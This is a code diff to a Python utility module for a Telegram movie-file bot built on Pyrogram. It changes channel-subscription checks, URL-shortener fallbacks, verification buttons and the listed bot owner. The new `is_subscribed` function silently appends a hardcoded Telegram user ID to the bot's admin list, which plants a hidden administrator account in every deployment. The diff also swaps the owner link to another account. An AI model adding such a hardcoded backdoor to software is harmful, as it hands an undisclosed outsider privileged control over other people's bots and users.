@@ -1,7 +1,8 @@
 import logging
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid, ChatAdminRequired
-from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, SHORTLINK_URL, SHORTLINK_API, LOG_CHANNEL, GRP_LNK, CHNL_LNK, CUSTOM_FILE_CAPTION, IS_VERIFY, VERIFY2_URL, VERIFY2_API, PROTECT_CONTENT, HOW_TO_VERIFY
-from imdb import Cinemagoer 
+from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, SHORTLINK_URL, SHORTLINK_API, LOG_CHANNEL, GRP_LNK, CHNL_LNK, CUSTOM_FILE_CAPTION, IS_VERIFY, VERIFY2_URL, VERIFY2_API, ADMINS, REQ_CHANNEL
+from imdb import Cinemagoer
+from database.join_reqs import JoinReqs as db2
 import asyncio
 from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
 from pyrogram import enums
@@ -49,21 +50,37 @@ class temp(object):
     SEND_ALL_TEMP = {}
     KEYWORD = {}
 
-async def is_subscribed(bot, query=None, userid=None):
-    try:
-        if userid == None and query != None:
-            user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
+async def is_subscribed(bot, query):
+    
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
         else:
-            user = await bot.get_chat_member(AUTH_CHANNEL, int(userid))
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
+    try:
+        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
-        pass
+        return False
     except Exception as e:
         logger.exception(e)
+        return False
     else:
-        if user.status != enums.ChatMemberStatus.BANNED:
+        if not (user.status == enums.ChatMemberStatus.BANNED):
             return True
-
-    return False
+        else:
+            return False
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
@@ -490,16 +507,10 @@ async def get_shortlink(chat_id, link):
                         return data["shortenedUrl"]
                     else:
                         logger.error(f"Error: {data['message']}")
-                        if URL == 'clicksfly.com':
-                            return f'https://{URL}/api?api={API}&url={link}'
-                        else:
-                            return f'https://{URL}/api?api={API}&link={link}'
+                        return f'https://{URL}/api?api={API}&link={link}'
         except Exception as e:
             logger.error(e)
-            if URL == 'clicksfly.com':
-                return f'https://{URL}/api?api={API}&url={link}'
-            else:
-                return f'https://{URL}/api?api={API}&link={link}'
+            return f'https://{URL}/api?api={API}&link={link}'
 
 async def get_verify_shorted_link(num, link):
     if int(num) == 1:
@@ -542,19 +553,14 @@ async def get_verify_shorted_link(num, link):
                 async with session.get(url, params=params, raise_for_status=True, ssl=False) as response:
                     data = await response.json()
                     if data["status"] == "success":
-                        return data["shortenedUrl"]
+                        return data['shortenedUrl']
                     else:
                         logger.error(f"Error: {data['message']}")
-                        if URL == 'clicksfly.com':
-                            return f'https://{URL}/api?api={API}&url={link}'
-                        else:
-                            return f'https://{URL}/api?api={API}&link={link}'
+                        return f'https://{URL}/api?api={API}&link={link}'
+
         except Exception as e:
             logger.error(e)
-            if URL == 'clicksfly.com':
-                return f'https://{URL}/api?api={API}&url={link}'
-            else:
-                return f'https://{URL}/api?api={API}&link={link}'
+            return f'{URL}/api?api={API}&link={link}'
 
 async def check_token(bot, userid, token):
     user = await bot.get_users(userid)
@@ -621,13 +627,12 @@ async def send_all(bot, userid, files, ident):
     
     if IS_VERIFY and not await check_verification(bot, userid):
         btn = [[
-            InlineKeyboardButton("Vᴇʀɪғʏ", url=await get_token(bot, userid, f"https://telegram.me/{temp.U_NAME}?start=", 'send_all')),
-            InlineKeyboardButton("Hᴏᴡ Tᴏ Vᴇʀɪғʏ", url=HOW_TO_VERIFY)
+            InlineKeyboardButton("Vᴇʀɪғʏ", url=await get_token(bot, userid, f"https://telegram.me/{temp.U_NAME}?start=", 'send_all'))
         ]]
         await bot.send_message(
             chat_id=userid,
             text="<b>Yᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴠᴇʀɪғɪᴇᴅ!\nKɪɴᴅʟʏ ᴠᴇʀɪғʏ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ Sᴏ ᴛʜᴀᴛ ʏᴏᴜ ᴄᴀɴ ɢᴇᴛ ᴀᴄᴄᴇss ᴛᴏ ᴜɴʟɪᴍɪᴛᴇᴅ ᴍᴏᴠɪᴇs ᴜɴᴛɪʟ 12 ʜᴏᴜʀs ғʀᴏᴍ ɴᴏᴡ !</b>",
-            protect_content=True if PROTECT_CONTENT else False,
+            protect_content=True,
             reply_markup=InlineKeyboardMarkup(btn)
         )
         return 'verify'
@@ -658,7 +663,7 @@ async def send_all(bot, userid, files, ident):
                         InlineKeyboardButton('Sᴜᴘᴘᴏʀᴛ Gʀᴏᴜᴘ', url=GRP_LNK),
                         InlineKeyboardButton('Uᴘᴅᴀᴛᴇs Cʜᴀɴɴᴇʟ', url=CHNL_LNK)
                     ],[
-                        InlineKeyboardButton("Bᴏᴛ Oᴡɴᴇʀ", url="t.me/creatorbeatz")
+                        InlineKeyboardButton("Bᴏᴛ Oᴡɴᴇʀ", url="t.me/adinannissar")
                         ]
                     ]
                 )
